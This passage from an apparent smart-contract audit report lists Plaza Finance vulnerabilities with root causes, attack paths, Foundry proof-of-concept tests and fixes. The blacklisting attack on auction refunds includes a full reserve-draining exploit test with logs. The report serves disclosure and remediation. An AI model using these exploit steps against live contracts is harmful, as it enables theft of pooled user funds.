     * @dev Override to grant the Vault infinite allowance, causing for Pool Tokens to not require approval.
     *
     * This is sound as the Vault already provides authorization mechanisms when initiation token transfers, which this
     * contract inherits.
     */
function allowance(address owner, address spender) public view override returns (uint256) {
        if (spender == address(getVault())) {
            return uint256(-1);
        } else {
            return super.allowance(owner, spender);
        }
    }
```

When the router tries to approve the vault, it uses `safeIncreaseAllowance` from OpenZeppelin’s `SafeERC20` library, which is implemented in the following way:

```solidity
// File: SafeERC20.sol

/**
     * @dev Increase the calling contract's allowance toward `spender` by `value`. If `token` returns no value,
     * non-reverting calls are assumed to be successful.
     */
    function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {
        uint256 oldAllowance = token.allowance(address(this), spender);
        forceApprove(token, spender, oldAllowance + value);
    }
```

Because `oldAllowance` will be `type(uint256).max` when `spender` is the Balancer vault, the following  `oldAllowance + value` addition will overflow, effectively preventing any withdrawal to be performed via the `BalancerRouter` contract.

### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path

1. User calls `exitPlazaAndBalancer`
2. The router tries to approve the `balancerVault` as a spender for the `balancerPoolToken`. The `safeIncreaseAllowance` function is called, and an overflow is triggered, DoS’ing any exit via the router.

### Impact

Medium. The `exitPlazaAndBalancer` will **never work.** Because this effectively **breaks core contract functionality and effectively renders the contract useless** (the main purpose of the router is to allow pool deposits/withdrawals and wrap/unwrap BPT tokens while doing it, and it has been demonstrated that withdrawals will never work, a core mechanism of the router), this issue should be deemed medium severity.

### PoC

The following proof of concept illustrates the overflow. To run it, just create a foundry project and paste the following test contract:

```solidity

contract ContractTest is Test {
    string BASE_RPC_URL = vm.envString("BASE_RPC_URL");

    // -- CREATE CONSTANTS HERE --

    using SafeERC20 for IERC20;

    // -- CREATE STORAGE VARIABLES HERE --

    IERC20 public pool = IERC20(0xC771c1a5905420DAEc317b154EB13e4198BA97D0); // BPT token
    address public vault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; // Balancer vault

    function setUp() public {
        vm.createSelectFork(BASE_RPC_URL);
    }

    function testBalancer_approvalOverflow() public {
        pool.safeIncreaseAllowance(vault, 1e18); // reverts with arithmetic error
    }

   
}

library SafeERC20 {
    function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        // ...
    }
}

interface IERC20 {
    function allowance(address user, address operator) external view returns (uint256);
}

```

Then, create a `.env` with and set `BASE_RPC_URL` to an RPC, and run the poc with `forge test --mt testBalancer_approvalOverflow`. It will revert with “panic: arithmetic underflow or overflow (0x11)” reason.

### Mitigation

Don’t approve the Balancer vault when withdrawing.

```diff
// File: BalancerRouter.sol
function _exitBalancerPool(
        bytes32 poolId,
        IAsset[] memory assets,
        uint256 balancerPoolTokenIn,
        uint256[] memory minAmountsOut,
        bytes memory userData,
        address to
    ) internal {
        IVault.ExitPoolRequest memory request = IVault.ExitPoolRequest({
            assets: assets,
            minAmountsOut: minAmountsOut,
            userData: userData,
            toInternalBalance: false
        });

-        balancerPoolToken.safeIncreaseAllowance(address(balancerVault), balancerPoolTokenIn); 
        balancerVault.exitPool(poolId, address(this), payable(to), request);
    }
```

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Convexity-Research/plaza-evm/pull/146




# Issue M-13: Potential reedem rate rounding to zero 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/864 

## Found by 
056Security, 0x23r0, 0x52, 0xAadi, 0xadrii, Abhan1041, Harry\_cryptodev, KiroBrejka, Matin, Negin, OrangeSantra, Ryonen, X0sauce, Z3R0, ZoA, almurhasan, bretzel, carlitox477, denys\_sosnovskyi, future, fuzzysquirrel, globalace, robertauditor, solidityenj0yer, stuart\_the\_minion, super\_jack

### Summary

Due to bad order of operations, redeem rate can be be rounded down to zero causing transactions reverting in otherwise normal conditions, especially in causes of low TVL value or high bond supply.

### Root Cause

[Pool::getRedeemAmount()](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/14a962c52a8f4731bbe4655a2f6d0d85e144c7c2/plaza-evm/src/Pool.sol#L514) is used to calculate the redeem rate in leverage token types:

```solidity
  function getRedeemAmount(
    ...
  ) public pure returns(uint256) {
    ...
    } else if (tokenType == TokenType.LEVERAGE) {
      redeemRate = ((tvl - (bondSupply * BOND_TARGET_PRICE)) / assetSupply) * PRECISION;
    ...
  }
```

In cases of low TVL or scenarios where `bondSupply` makes up a large part of the TVL, the `redeemRate` in this case will be rounded to zero as the `assetSupply` will undoubtedly be much larger. This leads to a loss of precision which wrongly calculates the redeem amount as zero, thus leading to the transaction reverting in the `_redeem()` function:

```solidity
  function _redeem(
   ...
   ) private returns(uint256) {
    // Get amount to mint
    uint256 reserveAmount = simulateRedeem(tokenType, depositAmount);

    // Check whether reserve contains enough funds
    if (reserveAmount < minAmount) {
      revert MinAmount();
    }

    // Reserve amount should be higher than zero
    if (reserveAmount == 0) {
      revert ZeroAmount();
    }

   ...
  }
```

### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path

_No response_

### Impact

Inability for users to redeem in low TVL or mostly bonded markets

### PoC

_No response_

### Mitigation

Change the order:

```solidity
      redeemRate = ((tvl - (bondSupply * BOND_TARGET_PRICE)) * PRECISION) / assetSupply;
```

# Issue M-14: Attacker can drain most of the reserves by weaponizing USDC blacklisting 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/866 

## Found by 
056Security, 0rpse, 0x23r0, 0x52, 0xAkira, 0xDLG, 0xDemon, 0xEkko, 0xGondar, 0xadrii, 0xmystery, Aymen0909, Boy2000, ChainProof, DenTonylifer, Goran, KiroBrejka, KlosMitSoss, PeterSR, Ryonen, Strapontin, Waydou, X0sauce, ZeroTrust, ZoA, almurhasan, alphacipher, ccvascocc, copperscrewer, denys\_sosnovskyi, eLSeR17, farismaulana, fuzzysquirrel, jprod15, n1ikh1l, novaman33, pashap9990, phoenixv110, silver\_eth, simeonk, t.aksoy, t0x1c, tinnohofficial, zraxx, zxriptor

### Summary

Auction mechanism uses push transfer to refund the lowest bidder when their bid has fallen out of the queue. Since refund token will be USDC, this opens a possibility to weaponize USDC blacklisting feature and attack the protocol to drain the reserves out of it.

### Root Cause

Auction mechanism can be taken advantage of. The key root cause which enables the vulnerability is in the [_removeBid](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/14a962c52a8f4731bbe4655a2f6d0d85e144c7c2/plaza-evm/src/Auction.sol#L298).

Auction works by collecting bids. There can be at most 1000 active bids. When the next bids come it will replace the currently lowest bid. Lowest bid is then removed and that bidder is refunded:
```solidity
  function _removeBid(uint256 bidIndex) internal {
     ...
    // Refund the buy tokens for the removed bid
    IERC20(buyCouponToken).safeTransfer(bidder, sellCouponAmount);

    emit BidRemoved(bidIndex, bidder, buyReserveAmount, sellCouponAmount);

    delete bids[bidIndex];
    bidCount--;
  }
```

The issue is that coupon token is USDC and refund triggered by `safeTransfer ` will fail if the receiver (the original bidder) is blacklisted. In that case no more bids can enter the system since removing the currently lowest bid will always revert.

This scenario can happen by accident where bidder gets blacklisted. However, it can also be weaponized by attacker to perform an attack on the protocol and drain the majority of the funds from the pool. Attack can look like this:
- immediately after new auction is started attacker submits 999 super low bids from `addressA` to acquire ~90% of WETH reserves (auction can't sell more than that)
- from another `addressB` attacker submits the last 1000th bid which is even lower than previous ones, and thus the lowest in the system
- attacker intentionally gets his `addressB` USDC-blacklisted by CIrcle by ie. interacting with OFAC-sanctioned entities 
- now attacker has guaranteed that no new bids can enter the system (removing the bid would revert) and attacker's super low 999 bids will be accepted by protocol

One thing which is not fully in attacker's control is getting the `addressB` blacklisted in timely manner, before other bidders outbid the attacker's lowest bid. But attacker can increase the likelihood of getting blacklisted by immediately starting to interact with sanctioned addresses and doing other sanctionable actions. This would automatically flag the address and the malicious behaviour to Circle. On other hand, auction period lasts for 10 days, so other bidders are not in rush to submit their bids. Those factors increase the likelihood of successful attack.

### Internal Pre-conditions

No specific internal pre-conditions

### External Pre-conditions

1. Attacker has to be the first bidder to submit bid (more precisely he will submit 1000 bids atomically)
2. Attacker has to manage to USDC-blacklist his address used to submit 1000th bid

### Attack Path

New auction has started. Attacker immediately executes the attack by atomically performing:
1. From addressA submit 999 bids. USDC amount is minimal in every bid - a single `slotSize`. WETH amount requested in each bid is ~1/1000 * (90% of WETH reserves). 
2. From address B attacker submits a single bid which fills up the 1000th place in the queue. This will be the lowest bid. USDC amount is a single `slotSize`, and WETH amount requested is 1 wei less then previous 999 bids, This ensures that this bid is the lowest one
3. From addressB attacker starts interacting (like sending some USDC) with OFAC santcioned addresses. This should automatically trigger Circle's USDC blacklisting process
4. Now when legitimate bidder sends their bid, the lowest bid has to be removed (as queue is full at 1000). However removing the bid means sending the refund USDC back to the blacklisted `addressB` - this will revert.
5. No one can add the new bid. Auction times passes and `endAuction` is triggered
6. Auction is successfully finished. Attacker can now claim his 999 bids. In this way attacker acquires ~90% of WETH reserves for only 999 `slotSize` amounts of USDC spent. In the POC, it is demonstarted how attacked acquires ~850 WETH for ~7500 USDC

### Impact

Pool can lose up to 90% percent of the reserves (or whatever pool sale limit is set to).

### PoC

This PoC shows how attacker can drain most of the reserve funds from the Auction by spending a relatively much smaller USDC amount.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";

import "../src/Pool.sol";
import {Token} from "./mocks/Token.sol";
import {Utils} from "../src/lib/Utils.sol";
import {BondToken} from "../src/BondToken.sol";
import {PoolFactory} from "../src/PoolFactory.sol";
import {Distributor} from "../src/Distributor.sol";
import {OracleFeeds} from "../src/OracleFeeds.sol";
import {LeverageToken} from "../src/LeverageToken.sol";
import {MockPriceFeed} from "./mocks/MockPriceFeed.sol";
import {Deployer} from "../src/utils/Deployer.sol";
import {UpgradeableBeacon} from "@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "forge-std/console.sol";

contract PoolTest_FeeCollection is Test {
    address deployer = makeAddr("deployer");
    address feeBeneficiary = makeAddr("feeBeneficiary");
    address governance = makeAddr("governance");

    MockPriceFeed mockPriceFeed;

    // 5% fee
    uint256 fee = 50000;

    function test_AuctionExploit() public {
        // create factory
        PoolFactory factory = _createFactory();
        console.log("Factory created");

        // create tokens
        address reserveToken = address(new Token("Wrapped  ETH", " WETH", false));
        address couponToken = address(new Token("USDC", "USDC", false));
        Token(couponToken).setDecimals(6);

        // create pool
        Pool pool = _createPool(factory, reserveToken, couponToken);
        console.log("Pool created");

        // there is 1000 WETH deposited in the pool (for simplicity in 1 call)
        address alice = makeAddr("alice");
        uint256 deposit = 1000 ether;
        deal(reserveToken, alice, deposit);
        console.log("Users deposits 1000 WETH");
        vm.startPrank(alice);
        IERC20(reserveToken).approve(address(pool), deposit);
        pool.create({tokenType: Pool.TokenType.BOND, depositAmount: deposit, minAmount: 0});
        vm.stopPrank();

        // one distribution period has passed
        vm.warp(block.timestamp + pool.getPoolInfo().distributionPeriod + 1);

        // set 10 days auction period
        uint256 auctionPeriod = 10 days;
        vm.prank(governance);
        pool.setAuctionPeriod(auctionPeriod);

        // start auction
        pool.startAuction();
        Auction auction = Auction(pool.auctions(0));
        uint256 totalCouponAmount = auction.totalBuyCouponAmount();
        uint256 slotSize = totalCouponAmount / 1000;
        console.log("Amount of USDC to be collected in auction:", totalCouponAmount);
        console.log("Slot size:", slotSize);

        //// START EXPLOIT

        // 1st step - attacker submits 999 bids to buy most of the availabe WETH (estimated 90% of reserves at the auction end time)
        // USDC amount is the minimal - 1x slotSize
        // WETH amount is ~ 1/1000 of 90% of reserves per bid (because at most 90% of reserves can be sold in auction)
        address attackerAddressA = makeAddr("attacker address A");
        uint256 wethAmount = 0.85 ether;
        uint256 usdcAmount = slotSize;
        deal(couponToken, attackerAddressA, slotSize * usdcAmount);
        vm.startPrank(attackerAddressA);
        uint256 numberOfBids = 999;
        IERC20(couponToken).approve(address(auction), numberOfBids * usdcAmount);
        for (uint256 i = 0; i < numberOfBids; i++) {
            auction.bid({buyReserveAmount: wethAmount, sellCouponAmount: usdcAmount});
        }
        vm.stopPrank();
        console.log("addressA submitted 999 bids");

        // 2nd step - submit 1000th bid (the one that fills up the bid queue) from another address
        // USDC amount spent is minimal - 1x slotSize per bid
        // WETH amount is a little bit lower than in previous 999 bids - this bid has to be the lowest one
        address attackerAddressB = makeAddr("attacker address B");
        wethAmount += 1;
        usdcAmount = slotSize;
        deal(couponToken, attackerAddressB, usdcAmount);
        vm.startPrank(attackerAddressB);
        IERC20(couponToken).approve(address(auction), usdcAmount);
        auction.bid({buyReserveAmount: wethAmount, sellCouponAmount: usdcAmount});
        vm.stopPrank();
        console.log("addressB submitted 1000th bid");

        // 3rd step - now attacker's goal is to get his addressB blacklisted by Circle as soon as possible.
        // Quick way to do it is to start sending TXs to the US OFAC sanctioned entities. This should automatically trigger blacklisting process
        // Here we mock blacklisting of the addressB
        vm.mockCallRevert(
            couponToken, abi.encodeWithSelector(IERC20.transfer.selector, attackerAddressB, slotSize), "Blacklisted!"
        );
        console.log("addressB (lowest bidder) got blacklisted");

        // 4th step - legitimate bidder tries to submit bid. Since queue is already filled with 1000 bids, the lowest one has to be removed.
        // However removing the lowest bid means sending refund USDC to the blacklisted address -> TX will revert
        address legitimateBidder = makeAddr("legitimateBidder");
        wethAmount = 1 ether;
        usdcAmount = slotSize * 40;
        deal(couponToken, legitimateBidder, usdcAmount);
        vm.startPrank(legitimateBidder);
        IERC20(couponToken).approve(address(auction), usdcAmount);
        console.log("Try submitting legitimate bid");
        auction.bid({buyReserveAmount: wethAmount, sellCouponAmount: usdcAmount});
        vm.stopPrank();
    }

    function _createFactory() internal returns (PoolFactory) {
        vm.startPrank(deployer);

        // create factory
        address oracleFeedsContract = address(new OracleFeeds());
        PoolFactory factory = PoolFactory(
            Utils.deploy(
                address(new PoolFactory()),
                abi.encodeCall(
                    PoolFactory.initialize,
                    (
                        governance,
                        address(new Deployer()),
                        oracleFeedsContract,
                        address(new UpgradeableBeacon(address(new Pool()), deployer)),
                        address(new UpgradeableBeacon(address(new BondToken()), deployer)),
                        address(new UpgradeableBeacon(address(new LeverageToken()), deployer)),
                        address(new UpgradeableBeacon(address(new Distributor()), deployer))
                    )
                )
            )
        );
        vm.stopPrank();

        vm.startPrank(governance);
        factory.grantRole(factory.POOL_ROLE(), deployer);
        vm.stopPrank();

        return factory;
    }

    function _createPool(PoolFactory factory, address reserveToken, address couponToken) internal returns (Pool) {
        vm.startPrank(deployer);
        uint256 reserveAmount = 1e18;
        deal(reserveToken, deployer, reserveAmount);
        IERC20(reserveToken).approve(address(factory), reserveAmount);

        // create pool
        Pool pool = Pool(
            factory.createPool({
                params: PoolFactory.PoolParams({
                    fee: fee,
                    feeBeneficiary: feeBeneficiary,
                    reserveToken: reserveToken,
                    sharesPerToken: 2_500_000,
                    distributionPeriod: 90 days,
                    couponToken: couponToken
                }),
                reserveAmount: reserveAmount,
                bondAmount: 10 ether,
                leverageAmount: 20 ether,
                bondName: "Bond  WETH",
                bondSymbol: "bond WETH",
                leverageName: "Levered  WETH",
                leverageSymbol: "lev WETH",
                pauseOnCreation: false
            })
        );

        // Deploy the mock price feed
        mockPriceFeed = new MockPriceFeed();
        mockPriceFeed.setMockPrice(3000 * int256(10 ** 8), uint8(8));
        OracleFeeds(factory.oracleFeeds()).setPriceFeed(
            address(pool.reserveToken()), address(0), address(mockPriceFeed), 1 days
        );
        vm.stopPrank();

        return pool;
    }
}
```

Running this test shows how legitimate bidder cannot submit bid, because removing the lowest bid will revert due to the blacklisted submitter.
```solidity
❯ forge test --mt test_AuctionExploit -vv

Ran 1 test for test/G_POC_WBTC.t.sol:PoolTest_FeeCollection
[FAIL: Blacklisted!] test_AuctionExploit() (gas: 1077754809)
Logs:
  Factory created
  Pool created
  Users deposits 1000 WETH
  Amount of USDC to be collected in auction: 75025000000
  Slot size: 75025000
  addressA submitted 999 bids
  addressB submitted 1000th bid
  addressB (lowest bidder) got blacklisted
  Try submitting legitimate bid

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.55s (2.55s CPU time)
```

Now let's expand the test to demonstrate how auction ends and attacker drains the reserves:
```diff
        // 4th step - legitimate bidder tries to submit bid. Since queue is already filled with 1000 bids, the lowest one has to be removed.
        // However removing the lowest bid means sending refund USDC to the blacklisted address -> TX will revert
        address legitimateBidder = makeAddr("legitimateBidder");
        wethAmount = 1 ether;
        usdcAmount = slotSize * 40;
        deal(couponToken, legitimateBidder, usdcAmount);
        vm.startPrank(legitimateBidder);
        IERC20(couponToken).approve(address(auction), usdcAmount);
        console.log("Try submitting legitimate bid");
+       vm.expectRevert("Blacklisted!");
        auction.bid({buyReserveAmount: wethAmount, sellCouponAmount: usdcAmount});
        vm.stopPrank();

+       // 5th step - after auction ends attacker claims his 999 bids. Ends up acquiring 849.15 WETH for ~7500 USDC.
+       vm.warp(block.timestamp + 10 days);
+       auction.endAuction();
+       assertEq(uint256(auction.state()), uint256(Auction.State.SUCCEEDED));
+       console.log("Auction ended successfully");
+
+       vm.startPrank(attackerAddressA);
+       for (uint256 i = 0; i < numberOfBids; i++) {
+           auction.claimBid(i + 1);
+       }
+       assertEq(IERC20(reserveToken).balanceOf(attackerAddressA), 999 * 0.85 ether);
+
+       console.log("Attacker's amount of USDC spent:", 100 * slotSize);
+       console.log("Attacker's amount of WETH acquired:", IERC20(reserveToken).balanceOf(attackerAddressA));
```

Run it:
```solidity
❯ forge test --mt test_AuctionExploit -vv

[PASS] test_AuctionExploit() (gas: 1114214211)
Logs:
  Factory created
  Pool created
  Users deposits 1000 WETH
  Amount of USDC to be collected in auction: 75025000000
  Slot size: 75025000
  addressA submitted 999 bids
  addressB submitted 1000th bid
  addressB (lowest bidder) got blacklisted
  Try submitting legitimate bid
  Auction ended successfully
  Attacker's amount of USDC spent: 7502500000
  Attacker's amount of WETH acquired: 849150000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.60s (2.59s CPU time)
```

As seen in the output attacker acquired 849.15 WETH by spending only ~7500 USDC on the attack!

### Mitigation

Use pull instead of push approach for USDC refunds (in the case of automatically removing the lowest bid)

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Convexity-Research/plaza-evm/pull/138




# Issue M-15: Auctions succeeding condition does not take into account the claimable fees in the pool. It can result of a drastical reduction of claimable fees if auction succeeds, or cause an auction to fail if the fees are claimed 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/891 

## Found by 
0xadrii, BADROBINX, Boy2000, Strapontin, bladeee, copperscrewer, i3arba, komane007, phoenixv110, shiazinho, t0x1c, y4y

### Summary

One of the condition for an auction to succeed is to have the [total bet of `reserveToken` be less than or equal to 90%](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Auction.sol#L341) (or higher, set by admin) of the pool's balance to ensure tokens are transfered.

This calculation does not take into account the amount of fees claimable by the beneficiary, and can result in two issues :

- When an auction succeeds, it gets from the pool the amount of tokens users bet. This will drastically reduce the fees claimable from the beneficiary as it lowers the pool's balance, which is linked to fees calculation.

- If an auction should succeed by having the total of reserveToken bid being on the lower edge of the 90% of pool's token amount, and the fees are claimed, then the auction may fail if the reserveToken bid become higher than the newly calculated 90% to tokens in the pool.

### Root Cause

Auction does not includes the claimable fees when calculating the reserve amount it can receive

### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path

### Attack path 1

1. An auction is created and the condition for it to succeed are met (with an average total amount of `reserveToken` bid)
2. The amount of fees claimable are equal to X
3. The function `Auction::endAuction` is called and the auction succeeds, taking `reserveToken` from the pool
4. The amount of fees claimable are now lower than X

### Attack path 2

1. An auction is created and the condition for it to succeed are met (with a high total amount of `reserveToken` bid, near 90%)
2. The fees are claimed
3. The function `Auction::endAuction` is called and the auction ends in the state `FAILED_POOL_SALE_LIMIT` because the bids are higher than allowed amount of `reserveToken`

### Impact

Drastic reduction of fees claimable and potential auction ending in an unsuccessful state

### PoC

> To get the amount of fees claimable from the pool, set the visibility of the function `Pool::getFeeAmount` to public

Copy this poc in Auction.t.sol and run it

```solidity
    // forge test --mt test_auction_fees_1 -vvv
    function test_auction_fees_1() public {
        // We need to set the poolSaleLimit to 90% because it is set to 110% in the setUp
        uint256 poolSaleLimitSlot = 6;
        vm.store(address(auction), bytes32(poolSaleLimitSlot), bytes32(uint256(90)));
        console.log(auction.poolSaleLimit());

        // Set the fees at 10%
        vm.prank(governance);
        Pool(pool).setFee(100000);

        uint256 maxUSDCToBid = auction.totalBuyCouponAmount();
        // If we go beyond this value, endAuction will end in a failed state (FAILED_POOL_SALE_LIMIT)
        uint256 maxReserveTokenClaimable =
            (IERC20(auction.sellReserveToken()).balanceOf(pool) * auction.poolSaleLimit()) / 100;

        // 1. The auction can succeed, and will rewards users for half of the pool's claimable amount
        vm.startPrank(bidder);

        usdc.mint(bidder, maxUSDCToBid);
        usdc.approve(address(auction), maxUSDCToBid);

        auction.bid(maxReserveTokenClaimable / 2, maxUSDCToBid);

        vm.stopPrank();

        vm.warp(auction.endTime());

        // 2. Amount of fees claimable are equal to X
        // Set `getFeeAmount` to public to see its result value
        uint256 claimableFeesBefore = Pool(pool).getFeeAmount();
        console.log("claimableFeesBefore", claimableFeesBefore);

        // 3. `endAuction` put the auction in the succeed state
        auction.endAuction();
        assert(Auction.State.SUCCEEDED == auction.state());

        // 4. The amount of fees claimable are now lower than X
        uint256 claimableFeesAfter = Pool(pool).getFeeAmount();
        console.log("claimableFeesAfter ", claimableFeesAfter);

        assert(claimableFeesBefore > claimableFeesAfter);
    }

    // forge test --mt test_auction_fees_2 -vvv
    function test_auction_fees_2() public {
        // We need to set the poolSaleLimit to 90% because it is set to 110% in the setUp
        uint256 poolSaleLimitSlot = 6;
        vm.store(address(auction), bytes32(poolSaleLimitSlot), bytes32(uint256(90)));
        console.log(auction.poolSaleLimit());

        // Set the fees at 10%
        vm.startPrank(governance);
        Pool(pool).setFee(100000);
        Pool(pool).setFeeBeneficiary(governance);
        vm.stopPrank();

        uint256 maxUSDCToBid = auction.totalBuyCouponAmount();
        // If we go beyond this value, endAuction will end in a failed state (FAILED_POOL_SALE_LIMIT)
        uint256 maxReserveTokenClaimable = (IERC20(auction.sellReserveToken()).balanceOf(pool) * auction.poolSaleLimit()) / 100;

        // 1. The auction can succeed, and will rewards users for almost the pool's claimable amount
        vm.startPrank(bidder);

        usdc.mint(bidder, maxUSDCToBid);
        usdc.approve(address(auction), maxUSDCToBid);

        auction.bid(maxReserveTokenClaimable - 10, maxUSDCToBid);

        vm.stopPrank();

        vm.warp(auction.endTime());

        // 2. The fees are claimed
        vm.prank(governance);
        Pool(pool).claimFees();

        // 3. Ending the auction fails it
        auction.endAuction();
        assert(Auction.State.FAILED_POOL_SALE_LIMIT == auction.state());

        // Note that without the governance claiming fees, the auction would succeed
    }
```

Running them produces the following output :

```console
$ forge test --mt test_auction_fees_1 -vvv
[⠰] Compiling...
[⠒] Compiling 14 files with Solc 0.8.27
[⠰] Solc 0.8.27 finished in 24.60s
Compiler run successful!

Ran 1 test for test/Auction.t.sol:AuctionTest
[PASS] test_auction_fees_1() (gas: 448008)
Logs:
  90
  claimableFeesBefore 1369863013698630136986301369
  claimableFeesAfter  753424657534246575342465753

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 19.26ms (2.42ms CPU time)

Ran 1 test suite in 42.30ms (19.26ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

...

$ forge test --mt test_auction_fees_2 -vvv
[⠰] Compiling...
No files changed, compilation skipped

Ran 1 test for test/Auction.t.sol:AuctionTest
[PASS] test_auction_fees_2() (gas: 467880)
Logs:
  90

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 19.09ms (2.16ms CPU time)

Ran 1 test suite in 39.14ms (19.09ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Mitigation

Include the claimable fees when calculating the total sell token limit at the end of an auction, or allocate an amount of tokens for an auction when the auction is created.

# Issue M-16: BondOracleAdapter can fetch price from inefficient Pool on Aerodrome 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/931 

## Found by 
0x52, 0xadrii, ZeroTrust, bretzel, zxriptor

### Summary

The `BondOracleAdapter`'s `getPool` function can select an inefficient pool, leading to inappropriate price feeds. An attacker can create a pool with an extremely low fee and inefficient tick spacing, which the adapter might prioritize, leading to a skewed price oracle.

### Root Cause

The `getPool` function in [`BondOracleAdapter.sol`](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/BondOracleAdapter.sol#L122C5-L122C90) iterates through an array of tick spacings (`spacing`) without considering the expected trading activity or fee structure for a Bond/USD pair that is a volatile pool.  It prioritizes pools with tighter tick spacing, even if they are inefficient.  The documentation ([no link provided in the original prompt](https://github.com/aerodrome-finance/docs/blob/main/content/liquidity.mdx#concentrated-pools)) states:

> Concentrated Liquidity Tick Spacing
> In Velodrome's concentrated liquidity pools, the concept of tick spacing is used. This refers to the minimum price movement between liquidity ranges.
>
> Stable token pools use a price range boundary of 0.5% (tick space 50) for tokens like USDC, DAI, LUSD.
>
> Volatile token pools use a price range boundary of 2% (tick space 200) for tokens like OP and WETH.
>
> For highly correlated tokens like stable coins and liquid staked tokens, a price range boundary of 0.01% (tick space 1) is available.
>
> For emerging tokens like AERO and VELO, a price range boundary of 20% (tick space 2000) is available to reduce liquidity pool re-balance needs.

The lack of a fee check, allows an attacker to create a pool with a very low fee that the adapter might select, further distorting the price feed.

### Internal Pre-conditions

N/A

### External Pre-conditions

1. An attacker must deploy a Concentrated Liquidity pool on the same `dexFactory` with the same `bondToken` and `liquidityToken`, but with an inefficient tick spacing (e.g., 1).

### Attack Path

1. The attacker deploys a pool with a very tight tick spacing (e.g., 1).  This pool is likely inefficient for a Bond/USD pair.
2. When the adapter is initialized or fetches the price, the `getPool` function is called.
3.The `getPool` function iterates through the `spacing` array and finds the attacker's pool. Because it prioritizes tighter tick spacing and lacks a fee check, it selects the attacker's inefficient pool.
4.The adapter now uses the inefficient pool for price information. This pool is susceptible to manipulation due to low liquidity (people don't want to lp in this pool).

### Impact

If this feeds is till retains inside `Pool.sol`, the protocol and its users rely on a distorted market price for bond token.  The attacker can manipulate the price in their inefficient pool.

### PoC

N/A

### Mitigation

Modify the `getPool` function to prioritize pools based on expected trading behavior and fee structure for the Bond/USD pair. Consider factors like typical trading volume and volatility when selecting a suitable tick spacing.  For example, start with more reasonable tick spacing.

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Convexity-Research/plaza-evm/pull/168




# Issue M-17: The state variable `BondToken.globalPool` is updated incorrectly via `Pool.startAuction()` 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/972 

## Found by 
0xmystery, MysteryAuditor, Pablo, X0sauce, bretzel, mxteem, silver\_eth, wellbyt3

## Summary

When an auction starts, the `globalPool` state variable of `BondToken` is updated incorrectly. This leads to the wrong calculation of coupon tokens that bondholders can claim.

## Root Cause

In the [startAuction()](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/14a962c52a8f4731bbe4655a2f6d0d85e144c7c2/plaza-evm/src/Pool.sol#L530-L571) function of `Pool.sol`, the state variable in `bondToken` is updated by calling `bondToken.increaseIndexedAssetPeriod(sharesPerToken)`.

```solidity
  function startAuction() external whenNotPaused() {
  
    ...

    // Calculate the coupon amount to distribute
    uint256 couponAmountToDistribute = (normalizedTotalSupply * normalizedShares)
        .toBaseUnit(maxDecimals * 2 - IERC20(couponToken).safeDecimals());

    auctions[currentPeriod] = Utils.deploy(
      address(new Auction()),
      abi.encodeWithSelector(
        Auction.initialize.selector,
        address(couponToken),
        address(reserveToken),
        couponAmountToDistribute,
        block.timestamp + auctionPeriod,
        1000,
        address(this),
        poolSaleLimit
      )
    );

    // Increase the bond token period
    bondToken.increaseIndexedAssetPeriod(sharesPerToken);

    // Update last distribution time
    lastDistribution = block.timestamp;
  }
```

In the [increaseIndexedAssetPeriod()](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/14a962c52a8f4731bbe4655a2f6d0d85e144c7c2/plaza-evm/src/BondToken.sol#L217-L229) function of `BondToken.sol`, it updates the `globalPool` state variable by pushing a new `PoolAmount` struct to `globalPool.previousPoolAmounts`, setting `sharesPerToken` as `globalPool.sharesPerToken`. Then it updates `globalPool.sharesPerToken` with the new `sharesPerToken`.

This logic is correct only if `sharesPerToken` has not changed. However, the `setSharesPerToken()` function in `Pool.sol` allows for changes to `sharesPerToken`, and `globalPool.sharesPerToken` can only be updated when starting an auction.

If an auction starts with a new `sharesPerToken`, the function uses the previous value (`globalPool.sharesPerToken`), which is outdated. This leads to incorrect calculations of coupon tokens that bondholders can claim.

```solidity
  function increaseIndexedAssetPeriod(uint256 sharesPerToken) public onlyRole(DISTRIBUTOR_ROLE) whenNotPaused() {
    globalPool.previousPoolAmounts.push(
      PoolAmount({
        period: globalPool.currentPeriod,
        amount: totalSupply(),
        sharesPerToken: globalPool.sharesPerToken
      })
    );
    globalPool.currentPeriod++;
    globalPool.sharesPerToken = sharesPerToken;

    emit IncreasedAssetPeriod(globalPool.currentPeriod, sharesPerToken);
  }
```

```solidity
  function setSharesPerToken(uint256 _sharesPerToken) external NotInAuction onlyRole(poolFactory.GOV_ROLE()) {
    sharesPerToken = _sharesPerToken;

    emit SharesPerTokenChanged(sharesPerToken);
  }
```

As a result, the calculation of coupon tokens that bondholders can claim will be based on incorrect values.

```solidity
  function getIndexedUserAmount(address user, uint256 balance, uint256 period) public view returns(uint256) {
